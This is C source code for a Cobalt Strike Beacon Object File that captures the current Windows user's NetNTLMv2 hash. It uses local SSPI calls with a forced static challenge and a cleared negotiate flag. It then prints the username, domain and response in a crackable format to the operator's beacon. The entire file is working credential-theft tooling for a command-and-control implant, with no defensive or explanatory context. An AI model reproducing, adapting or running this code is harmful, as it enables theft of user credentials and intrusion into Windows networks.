#include <windows.h>
#define SECURITY_WIN32
#include <security.h>
#include "beacon.h"

// Declare necessary WinAPI function pointers for BOF
DECLSPEC_IMPORT void * WINAPI KERNEL32$HeapAlloc(void *, DWORD, SIZE_T);
DECLSPEC_IMPORT void * WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$HeapFree(void *, DWORD, void *);

DECLSPEC_IMPORT void * WINAPI MSVCRT$calloc(size_t, size_t);
DECLSPEC_IMPORT void   WINAPI MSVCRT$free(void *);
DECLSPEC_IMPORT int    WINAPI MSVCRT$vsnprintf(char *, size_t, const char *, va_list);
DECLSPEC_IMPORT void * WINAPI MSVCRT$memcpy(void *, const void *, size_t);
DECLSPEC_IMPORT void * WINAPI MSVCRT$memset(void *, int, size_t);

DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$AcquireCredentialsHandleA(
    LPSTR, LPSTR, ULONG, PLUID, PVOID, PVOID, PVOID, PCredHandle, PTimeStamp);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$InitializeSecurityContextA(
    PCredHandle, PCtxtHandle, SEC_CHAR *, ULONG, ULONG, ULONG,
    PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$AcceptSecurityContext(
    PCredHandle, PCtxtHandle, PSecBufferDesc, ULONG, ULONG, PCtxtHandle,
    PSecBufferDesc, PULONG, PTimeStamp);


#define MSV1_0_CHALLENGE_LENGTH 8
#define BUF_SIZE 8192

char *output = NULL;
WORD currentoutsize = 0;

// Internal NTLM structure definitions
typedef struct _CHALLENGE_MESSAGE {
    BYTE Signature[8];
    ULONG MessageType;
    struct { USHORT Length, MaxLength; ULONG Offset; } TargetName;
    ULONG NegotiateFlags;
    BYTE Challenge[MSV1_0_CHALLENGE_LENGTH];
} CHALLENGE_MESSAGE, *PCHALLENGE_MESSAGE;

typedef struct _AUTHENTICATE_MESSAGE {
    BYTE Signature[8];
    ULONG MessageType;
    struct { USHORT Length, MaxLength; ULONG Offset; } LmChallengeResponse;
    struct { USHORT Length, MaxLength; ULONG Offset; } NtChallengeResponse;
    struct { USHORT Length, MaxLength; ULONG Offset; } DomainName;
    struct { USHORT Length, MaxLength; ULONG Offset; } UserName;
    struct { USHORT Length, MaxLength; ULONG Offset; } Workstation;
    struct { USHORT Length, MaxLength; ULONG Offset; } EncryptedRandomSessionKey;
    ULONG NegotiateFlags;
} AUTHENTICATE_MESSAGE, *PAUTHENTICATE_MESSAGE;

typedef struct _NTLMv2_RESPONSE {
    BYTE Response[16];
    BYTE Challenge[]; // variable length
} NTLMv2_RESPONSE, *PNTLMv2_RESPONSE;

int bofstart() {
    output = (char *)MSVCRT$calloc(BUF_SIZE, 1);
    currentoutsize = 0;
    return output != NULL;
}

void internal_printf(const char *format, ...) {
    va_list args;
    va_start(args, format);
    int len = MSVCRT$vsnprintf(NULL, 0, format, args);
    va_end(args);
    if (len <= 0) return;

    char *buf = (char *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1);
    if (!buf) return;

    va_start(args, format);
    MSVCRT$vsnprintf(buf, len + 1, format, args);
    va_end(args);

    if (currentoutsize + len < BUF_SIZE) {
        MSVCRT$memcpy(output + currentoutsize, buf, len);
        currentoutsize += len;
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buf);
}

void printoutput(BOOL done) {
    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
    if (done) {
        MSVCRT$free(output);
        output = NULL;
    } else {
        MSVCRT$memset(output, 0, BUF_SIZE);
        currentoutsize = 0;
    }
}

void SetPredefinedChallenge(UCHAR challenge[MSV1_0_CHALLENGE_LENGTH]) {
    const UCHAR staticChallenge[MSV1_0_CHALLENGE_LENGTH] = {0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88};
    MSVCRT$memcpy(challenge, staticChallenge, MSV1_0_CHALLENGE_LENGTH);
}

BOOL GetNTLMChallengeAndResponse() {
    CredHandle hOutCred, hInCred;
    CtxtHandle OutCtx = {0}, InCtx = {0};
    TimeStamp life1, life2;
    SecBufferDesc outBufDesc = { SECBUFFER_VERSION, 1, NULL };
    SecBufferDesc inBufDesc = { SECBUFFER_VERSION, 1, NULL };
    SecBufferDesc finalBufDesc = { SECBUFFER_VERSION, 1, NULL };
    SecBuffer outBuf = {0}, inBuf = {0}, finalBuf = {0};
    ULONG attrs1 = 0, attrs2 = 0;

    CHAR szUser[257] = {0}, szDomain[257] = {0};
    UCHAR challengeVal[MSV1_0_CHALLENGE_LENGTH];

    outBuf.BufferType = SECBUFFER_TOKEN;
    inBuf.BufferType = SECBUFFER_TOKEN;
    finalBuf.BufferType = SECBUFFER_TOKEN;
    outBufDesc.pBuffers = &outBuf;
    inBufDesc.pBuffers = &inBuf;
    finalBufDesc.pBuffers = &finalBuf;

    if (SECUR32$AcquireCredentialsHandleA(NULL, "NTLM", SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hOutCred, &life1) != 0)
        return FALSE;
    if (SECUR32$AcquireCredentialsHandleA(NULL, "NTLM", SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, &hInCred, &life2) != 0)
        return FALSE;

    if (SECUR32$InitializeSecurityContextA(&hOutCred, NULL, NULL, ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, NULL, 0, &OutCtx, &outBufDesc, &attrs1, &life1) != SEC_I_CONTINUE_NEEDED)
        return FALSE;

    if (SECUR32$AcceptSecurityContext(&hInCred, NULL, &outBufDesc, ASC_REQ_ALLOCATE_MEMORY, SECURITY_NATIVE_DREP, &InCtx, &inBufDesc, &attrs2, &life2) != SEC_I_CONTINUE_NEEDED)
        return FALSE;

    PCHALLENGE_MESSAGE challenge = (PCHALLENGE_MESSAGE)inBuf.pvBuffer;
    SetPredefinedChallenge(challenge->Challenge);
    challenge->NegotiateFlags &= ~0x4000;

    if (SECUR32$InitializeSecurityContextA(&hOutCred, &OutCtx, NULL, ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, &inBufDesc, 0, &OutCtx, &finalBufDesc, &attrs1, &life1) != 0)
        return FALSE;

    PAUTHENTICATE_MESSAGE auth = (PAUTHENTICATE_MESSAGE)finalBuf.pvBuffer;
    MSVCRT$memcpy(szUser, (PBYTE)auth + auth->UserName.Offset, auth->UserName.Length);
    MSVCRT$memcpy(szDomain, (PBYTE)auth + auth->DomainName.Offset, auth->DomainName.Length);
    szUser[auth->UserName.Length] = 0;
    szDomain[auth->DomainName.Length] = 0;

    PNTLMv2_RESPONSE ntlm = (PNTLMv2_RESPONSE)((PBYTE)auth + auth->NtChallengeResponse.Offset);
    DWORD blobSize = auth->NtChallengeResponse.Length - 16;

    MSVCRT$memcpy(challengeVal, challenge->Challenge, sizeof(challengeVal));

    internal_printf("[+] Successful NetNTLMv2 hash capture:\n");
    internal_printf("%s::%s:", szUser, szDomain);
    for (int i = 0; i < sizeof(challengeVal); i++) internal_printf("%02x", challengeVal[i]);
    internal_printf(":");
    for (int i = 0; i < sizeof(ntlm->Response); i++) internal_printf("%02x", ntlm->Response[i]);
    internal_printf(":");
    for (DWORD i = 0; i < blobSize; i++) internal_printf("%02x", ntlm->Challenge[i]);
    internal_printf("\n");

    return TRUE;
}

int go() {
    if (!bofstart()) return 0;
    if (GetNTLMChallengeAndResponse())
        printoutput(TRUE);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to capture NetNTLM hash.\n");
    return 0;
}
